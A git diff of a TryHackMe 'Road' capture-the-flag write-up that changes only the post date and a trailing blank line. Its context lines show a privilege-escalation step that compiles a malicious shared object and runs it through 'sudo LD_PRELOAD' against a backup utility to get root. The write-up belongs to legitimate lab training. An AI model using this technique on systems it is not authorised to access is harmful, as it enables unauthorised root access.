@@ -1,7 +1,7 @@
 ---
 title: "[TryHackMe] Road"
 author: Tri Nguyen
-date: 2021-11-30 17:00:00 -0700
+date: 2021-11-30 20:40:00 -0700
 categories: [CTF, Write Up]
 tags: [ctf, write-up, tryhackme, road, thm]
 ---
@@ -116,4 +116,3 @@ void _init() {
 gcc -fPIC -shared -o exploit.so exploit.c -nostartfiles
 sudo LD_PRELOAD=exploit.so /usr/bin/sky_backup_utility
 ```
-
